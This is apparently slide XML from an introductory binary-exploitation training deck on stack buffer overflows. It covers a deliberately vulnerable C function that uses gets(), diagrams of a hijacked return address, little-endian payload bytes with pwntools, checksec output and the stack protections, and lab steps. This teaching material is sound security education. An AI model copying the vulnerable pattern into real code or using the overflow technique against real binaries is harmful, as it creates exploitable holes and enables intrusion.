            <a:endParaRPr lang="en-US" sz="650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8001000" y="2119908"/>
            <a:ext cx="428625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2C2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 Source</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4822031" y="2402086"/>
            <a:ext cx="214313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F2C2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void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5036344" y="2402086"/>
            <a:ext cx="1210866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vulnerable_function() {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4822031" y="2562095"/>
            <a:ext cx="228600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F2C2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5050631" y="2562095"/>
            <a:ext cx="364331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name[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5414963" y="2562095"/>
            <a:ext cx="121444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F2C2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5536406" y="2562095"/>
            <a:ext cx="67866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];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4822031" y="2722104"/>
            <a:ext cx="314325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printf(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5136356" y="2722104"/>
            <a:ext cx="917972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85CE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"Enter your name: "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6054328" y="2722104"/>
            <a:ext cx="71438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);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4822031" y="2874969"/>
            <a:ext cx="3607594" cy="160009"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="333300"/>
          </a:solidFill>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4822031" y="2874969"/>
            <a:ext cx="21431" cy="160009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31" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4822031" y="2874969"/>
            <a:ext cx="3607594" cy="160009"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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F2C2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gets(name); </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="85CE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// No bounds check!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4822031" y="3042121"/>
            <a:ext cx="314325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printf(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5136356" y="3042121"/>
            <a:ext cx="582216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85CE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"Hello %s\n"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5718572" y="3042121"/>
            <a:ext cx="414338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name);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822031" y="3202130"/>
            <a:ext cx="46434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}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571500" y="4636294"/>
            <a:ext cx="1382316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8333184" y="4579144"/>
            <a:ext cx="239316" cy="2786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08</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="837248" y="453985"/>
            <a:ext cx="958850" cy="1225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Invstigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="523875" y="42100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1" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="697230" y="464820"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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900" y="732067"/>
            <a:ext cx="8458200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Spilling past the edge onto EIP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342900" y="1550026"/>
            <a:ext cx="853678" cy="16430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7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="1550026"/>
            <a:ext cx="853678" cy="164306"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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STACK &amp; OVERFLOW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342900" y="1957220"/>
            <a:ext cx="4143375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Normal Input vs. Buffer Overflow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2900" y="2342983"/>
            <a:ext cx="4143375" cy="6171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input fits neatly inside the buffer allocated for it, saved pointers and return addresses remain untouched, and the function returns safely.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42900" y="3088723"/>
            <a:ext cx="4143375" cy="6171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input exceeds the allocated size, the excess bytes spill past the buffer boundary, overwriting adjacent stack slots and ultimately replacing the saved return address (EIP).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57725" y="1901912"/>
            <a:ext cx="4143375" cy="227171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2" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4786313" y="2030499"/>
            <a:ext cx="3886200" cy="9215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Normal Stack Layout ]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-----------------------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 Local Buffer (32B) |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 Saved EBP |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 Return Address (EIP)|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-----------------------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786313" y="3037768"/>
            <a:ext cx="3886200" cy="9215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Overwritten Stack ]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-----------------------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 AAAAAAAAAAAAAAAAAAA |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 BBBBBBBB |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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2C2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NEW EIP VALUE ]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| &lt;--- HIJACKED!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-----------------------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946922" y="4868466"/>
            <a:ext cx="125015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8511778" y="4718447"/>
            <a:ext cx="289322" cy="33932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09</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="623888" y="339685"/>
            <a:ext cx="958850" cy="1225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Invstigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="310515" y="30670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1" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="483870" y="350520"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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754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900" y="732067"/>
            <a:ext cx="8458200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Why addresses go in backwards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342900" y="1550026"/>
            <a:ext cx="989409" cy="16430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7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="1550026"/>
            <a:ext cx="989409" cy="164306"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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MEMORY ARCHITECTURE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342900" y="1957220"/>
            <a:ext cx="4903459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Byte Representation in x86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2900" y="2342983"/>
            <a:ext cx="4903459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Intel x86 architecture stores multi-byte values in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="90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little-endian format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meaning the least significant byte is stored at the lowest memory address.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42900" y="2883005"/>
            <a:ext cx="4903459" cy="6171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we write memory addresses into an exploit payload, we must reverse the byte order so the CPU interprets them correctly as a single 32-bit value.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32109" y="1532167"/>
            <a:ext cx="3268991" cy="18359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2" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5674984" y="1675042"/>
            <a:ext cx="2983241" cy="1535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Address Breakdown ]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674984" y="1900070"/>
            <a:ext cx="2983241" cy="1535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Memory Address: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2C2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0x08048536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674984" y="2125098"/>
            <a:ext cx="2983241" cy="1535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Byte Order in Memory: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746421" y="2350126"/>
            <a:ext cx="2911804" cy="6143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Lowest byte: \x36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Second byte: \x85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Third byte: \x04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Highest byte: \x08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674984" y="3071645"/>
            <a:ext cx="2983241" cy="1535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Payload: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2C2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\x36\x85\x04\x08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532109" y="3539561"/>
            <a:ext cx="3268991" cy="113585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Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5532109" y="3539561"/>
            <a:ext cx="3268991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9" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8793956" y="3539561"/>
            <a:ext cx="7144" cy="1135856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0" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5532109" y="4668273"/>
            <a:ext cx="3268991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1" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5532109" y="3539561"/>
            <a:ext cx="85725" cy="113585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2" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5674984" y="3682436"/>
            <a:ext cx="2983241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Automated by p32()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674984" y="3907464"/>
            <a:ext cx="2983241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Pwntools handles byte reversal automatically for 32-bit addresses.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674984" y="4282511"/>
            <a:ext cx="528638" cy="16430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5" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5674984" y="4282511"/>
            <a:ext cx="528638" cy="164306"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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PWNTOOLS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3946922" y="4986170"/>
            <a:ext cx="125015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8565356" y="4836151"/>
            <a:ext cx="235744" cy="33932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10</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="623888" y="339685"/>
            <a:ext cx="958850" cy="1225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Invstigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="310515" y="30670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1" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="483870" y="350520"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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900" y="732067"/>
            <a:ext cx="8458200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checksec — read the shields before you attack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342900" y="1550026"/>
            <a:ext cx="785813" cy="16430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7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="1550026"/>
            <a:ext cx="785813" cy="164306"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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RECONNAISSANCE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342900" y="1957220"/>
            <a:ext cx="4086225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Assessing Binary Protections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2900" y="2342983"/>
            <a:ext cx="4086225" cy="6171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Before attempting any exploitation, an analyst must inspect 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binary's compilation flags and built-in mitigations using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="90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checksec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42900" y="3088723"/>
            <a:ext cx="4086225" cy="6171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Knowing which defenses are active determines whether you can use direct stack execution, need a return-oriented programming (ROP) chain, or must bypass canaries.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14875" y="2275173"/>
            <a:ext cx="4086225" cy="1525191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2" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4886325" y="2446623"/>
            <a:ext cx="3743325" cy="1535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FF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checksec intro2pwn1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886325" y="2671651"/>
            <a:ext cx="3743325" cy="1535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[*] 'intro2pwn1'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957763" y="2860960"/>
            <a:ext cx="3671888" cy="7679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Arch: i386-32-little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RELRO: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2C2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Partial RELRO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Stack: No canary found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NX: NX disabled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PIE: No PIE (0x8048000)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946922" y="4868466"/>
            <a:ext cx="125015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8629650" y="4718447"/>
            <a:ext cx="171450" cy="33932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11</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="623888" y="339685"/>
            <a:ext cx="958850" cy="1225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Invstigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="310515" y="30670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1" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="483870" y="350520"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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900" y="732067"/>
            <a:ext cx="8458200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RELRO, Canary, NX, PIE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342900" y="1617892"/>
            <a:ext cx="4121944" cy="13127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Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="1617892"/>
            <a:ext cx="4121944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8" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4457700" y="1617892"/>
            <a:ext cx="7144" cy="131272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9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="2923468"/>
            <a:ext cx="4121944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0" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="1617892"/>
            <a:ext cx="85725" cy="1312720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11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="514350" y="1807201"/>
            <a:ext cx="385763" cy="16430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12" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="514350" y="1807201"/>
            <a:ext cx="385763" cy="164306"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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DETECT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="514350" y="1971508"/>
            <a:ext cx="3779044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Stack Canary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14350" y="2439144"/>
            <a:ext cx="3779044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guard value that detects buffer overflows before return (coal-mine bird analogy).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679156" y="1617892"/>
            <a:ext cx="4121944" cy="13127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Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4679156" y="1617892"/>
            <a:ext cx="4121944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7" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8793956" y="1617892"/>
            <a:ext cx="7144" cy="131272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8" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4679156" y="2923468"/>
            <a:ext cx="4121944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9" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4679156" y="1617892"/>
            <a:ext cx="85725" cy="1312720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0" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4850606" y="1807201"/>
            <a:ext cx="575072" cy="16430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1" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4850606" y="1807201"/>
            <a:ext cx="575072" cy="164306"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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BLOCK CODE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4850606" y="1971508"/>
            <a:ext cx="3779044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NX (Non-Executable)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50606" y="2439144"/>
            <a:ext cx="3779044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Ensures memory regions are either writable or executable, never both — blocks injected code.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342900" y="3144924"/>
            <a:ext cx="4121944" cy="13127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" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="3144924"/>
            <a:ext cx="4121944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6" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4457700" y="3144924"/>
            <a:ext cx="7144" cy="1312776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7" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="4450556"/>
            <a:ext cx="4121944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8" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="3144924"/>
            <a:ext cx="85725" cy="131277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9" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="514350" y="3334234"/>
            <a:ext cx="625078" cy="16430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30" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="514350" y="3334234"/>
            <a:ext cx="625078" cy="164306"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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MOVE TARGET</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="514350" y="3498540"/>
            <a:ext cx="3779044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PIE / ASLR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14350" y="3966232"/>
            <a:ext cx="3779044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Randomizes memory addresses on every run to break hardcoded pointers and fixed-address attacks.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679156" y="3144924"/>
            <a:ext cx="4121944" cy="13127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Shape 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4679156" y="3144924"/>
            <a:ext cx="4121944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5" name="Shape 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8793956" y="3144924"/>
            <a:ext cx="7144" cy="1312776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6" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4679156" y="4450556"/>
            <a:ext cx="4121944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7" name="Shape 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4679156" y="3144924"/>
            <a:ext cx="85725" cy="131277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38" name="Shape 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4850606" y="3334234"/>
            <a:ext cx="546497" cy="16430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39" name="Text 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4850606" y="3334234"/>
            <a:ext cx="546497" cy="164306"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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LOCK TABLE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Text 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4850606" y="3498540"/>
            <a:ext cx="3779044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RELRO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4850606" y="3966232"/>
            <a:ext cx="3779044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Makes the Global Offset Table (GOT) read-only after loading, preventing redirection of library calls.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3946922" y="4868466"/>
            <a:ext cx="125015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8586788" y="4718447"/>
            <a:ext cx="214313" cy="33932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12</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="623888" y="339685"/>
            <a:ext cx="958850" cy="1225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Invstigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Shape 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="310515" y="30670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6" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="483870" y="350520"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="47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900" y="732067"/>
            <a:ext cx="8458200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Canary vs no canary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342900" y="1550026"/>
            <a:ext cx="871538" cy="16430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7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="1550026"/>
            <a:ext cx="871538" cy="164306"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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DEFENSE VALIDATION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342900" y="1957220"/>
            <a:ext cx="4086225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Observing Protection Behavior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2900" y="2342983"/>
            <a:ext cx="4086225" cy="6171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a binary lacks a stack canary, overflowing the buffer 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silently overwrites the return address, leading to a standard </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="90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Segmentation Fault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upon function return.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42900" y="3088723"/>
            <a:ext cx="4086225" cy="6171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a canary is present, the program detects the corruption of the canary value prior to returning and immediately aborts execution with a security alert.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714875" y="1901912"/>
            <a:ext cx="4086225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2C2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[ WITHOUT CANARY ]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4714875" y="2109081"/>
            <a:ext cx="4086225" cy="7143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3" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4857750" y="2251956"/>
            <a:ext cx="3800475" cy="1428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00FF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r>
              <a:rPr lang="en-US" sz="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./intro2pwn_secure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857750" y="2394831"/>
            <a:ext cx="3800475" cy="1428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Enter name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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857750" y="2537706"/>
            <a:ext cx="3800475" cy="1428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2C2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Segmentation fault (core dumped)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714875" y="2966331"/>
            <a:ext cx="4086225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2C2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[ WITH CANARY ]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4714875" y="3173499"/>
            <a:ext cx="4086225" cy="85725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8" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4857750" y="3316374"/>
            <a:ext cx="3800475" cy="1428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00FF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r>
              <a:rPr lang="en-US" sz="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./intro2pwn_canary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57750" y="3459249"/>
            <a:ext cx="3800475" cy="1428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Enter name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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857750" y="3602124"/>
            <a:ext cx="3800475" cy="1428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2C2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*** stack smashing detected ***: terminated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857750" y="3744999"/>
            <a:ext cx="3800475" cy="1428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Aborted (core dumped)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946922" y="4868466"/>
            <a:ext cx="125015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8572500" y="4718447"/>
            <a:ext cx="228600" cy="33932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13</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="623888" y="339685"/>
            <a:ext cx="958850" cy="1225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Invstigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="310515" y="30670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1" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="483870" y="350520"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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900" y="732067"/>
            <a:ext cx="8458200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Lab 1 — map the defenses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342900" y="1378576"/>
            <a:ext cx="671513" cy="16430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7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="1378576"/>
            <a:ext cx="671513" cy="164306"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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HANDS-ON LAB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342900" y="1771483"/>
            <a:ext cx="4129088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Practical Execution Steps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2900" y="2114383"/>
            <a:ext cx="200025" cy="200025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10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="2114383"/>
            <a:ext cx="200025" cy="2000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628650" y="2242970"/>
            <a:ext cx="2464594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Navigate to the lab directory and run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093244" y="2242970"/>
            <a:ext cx="632222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0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checksec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725466" y="2242970"/>
            <a:ext cx="550069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both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28650" y="2432949"/>
            <a:ext cx="771581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intro2pwn1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400231" y="2432949"/>
            <a:ext cx="335756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735987" y="2432949"/>
            <a:ext cx="771581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intro2pwn2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2507568" y="2432949"/>
            <a:ext cx="582216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binaries.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42900" y="2762231"/>
            <a:ext cx="200025" cy="200025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19" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="2762231"/>
